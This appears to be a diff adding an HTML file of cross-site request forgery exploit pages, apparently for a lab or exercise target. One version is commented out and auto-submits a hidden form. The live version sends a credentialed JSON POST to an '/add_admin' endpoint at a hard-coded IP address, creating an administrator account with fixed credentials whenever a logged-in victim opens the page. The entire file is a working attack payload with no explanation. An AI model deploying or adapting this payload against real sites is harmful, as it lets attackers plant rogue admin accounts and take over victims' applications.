@@ -1,0 +1,54 @@
+<!--<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>POST</title>
+</head>
+<body>
+    <form id="myForm" action="http://92.63.179.34/add_admin" method="post">
+        <input type="hidden" value="user66" name="username">
+        <input type="hidden" value="user66" name="password">
+        <input type="hidden" value="yes" name="isAdmin">
+        <input type="submit">
+    </form>
+    <script>
+        document.getElementById('myForm').submit();
+    </script>
+</body>
+</html>-->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>JSON</title>
+</head>
+<body>
+    <form id="myForm" action="http://92.63.179.34/add_admin" method="post">
+        <input type="hidden" value="user777" name="username">
+        <input type="hidden" value="user777" name="password">
+        <input type="hidden" value="yes" name="isAdmin">
+        <input type="submit">
+    </form>
+    <script>
+        
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://92.63.179.34/add_admin", true);
+        xhr.setRequestHeader("Content-Type", "application/json");
+        xhr.withCredentials = true;
+
+        var data = JSON.stringify({
+            username: "user777",
+            password: "user777",
+            isAdmin: "yes",
+            submit: "Add User"
+        });
+        xhr.send(data);
+        
+    </script>
+</body>
+</html>
+
+
+
